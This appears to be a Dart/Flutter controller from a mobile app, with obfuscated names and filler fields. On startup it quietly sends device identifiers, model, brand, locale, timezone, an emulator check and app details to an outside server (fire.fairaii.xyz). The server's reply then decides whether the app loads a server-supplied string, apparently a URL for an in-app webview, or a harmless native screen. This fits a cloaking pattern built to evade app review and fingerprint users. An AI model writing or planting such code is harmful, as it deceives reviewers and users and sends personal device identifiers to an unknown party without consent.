import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var rdlcxtjzpm = RxBool(false);
  var auchirywz = RxBool(true);
  var qphncrbx = RxString("");
  var ignacio = RxBool(false);
  var murazik = RxBool(true);
  final ftkpnxsv = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    lkrqpsgz();
  }


  Future<void> lkrqpsgz() async {

    ignacio.value = true;
    murazik.value = true;
    auchirywz.value = false;

    ftkpnxsv.post("https://fire.fairaii.xyz/YUBFA0P1MFN9TA",data: await pkbgux()).then((value) {
      var oifryv = value.data["oifryv"] as String;
      var jpae = value.data["jpae"] as bool;
      if (jpae) {
        qphncrbx.value = oifryv;
        enrique();
      } else {
        ullrich();
      }
    }).catchError((e) {
      auchirywz.value = true;
      murazik.value = true;
      ignacio.value = false;
    });
  }

  Future<Map<String, dynamic>> pkbgux() async {
    final DeviceInfoPlugin tdzl = DeviceInfoPlugin();
    PackageInfo qsnoyu_rwljb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xbcuzofh = Platform.localeName;
    var zcuCVSG = currentTimeZone;

    var tDVfqBo = qsnoyu_rwljb.packageName;
    var VqBy = qsnoyu_rwljb.version;
    var oTWYpZG = qsnoyu_rwljb.buildNumber;

    var TGnmBh = qsnoyu_rwljb.appName;
    var robertaTurcotte = "";
    var maYT  = "";
    var EfzQCg = "";
    var lutherLowe = "";
    var vanceHalvorson = "";
    var friedrichGaylord = "";
    var dariusWhite = "";
    var vinceKihn = "";
    var nigelFlatley = "";
    var jamarcusDietrich = "";

    var WxjE = "";

    var kEtL = "";
    var auMVeIq = false;

    if (GetPlatform.isAndroid) {
      kEtL = "android";
      var nyzrojsdw = await tdzl.androidInfo;

      EfzQCg = nyzrojsdw.brand;

      WxjE  = nyzrojsdw.model;
      maYT = nyzrojsdw.id;

      auMVeIq = nyzrojsdw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      kEtL = "ios";
      var lyiunkmwp = await tdzl.iosInfo;
      EfzQCg = lyiunkmwp.name;
      WxjE = lyiunkmwp.model;

      maYT = lyiunkmwp.identifierForVendor ?? "";
      auMVeIq  = lyiunkmwp.isPhysicalDevice;
    }

    var res = {
      "VqBy": VqBy,
      "tDVfqBo": tDVfqBo,
      "robertaTurcotte" : robertaTurcotte,
      "WxjE": WxjE,
      "jamarcusDietrich" : jamarcusDietrich,
      "zcuCVSG": zcuCVSG,
      "vanceHalvorson" : vanceHalvorson,
      "EfzQCg": EfzQCg,
      "maYT": maYT,
      "xbcuzofh": xbcuzofh,
      "kEtL": kEtL,
      "auMVeIq": auMVeIq,
      "lutherLowe" : lutherLowe,
      "dariusWhite" : dariusWhite,
      "TGnmBh": TGnmBh,
      "vinceKihn" : vinceKihn,
      "nigelFlatley" : nigelFlatley,
      "friedrichGaylord" : friedrichGaylord,
      "oTWYpZG": oTWYpZG,

    };
    return res;
  }

  Future<void> ullrich() async {
    Get.offAllNamed("/computer_tab");
  }

  Future<void> enrique() async {
    Get.offAllNamed("/level_tis");
  }

}
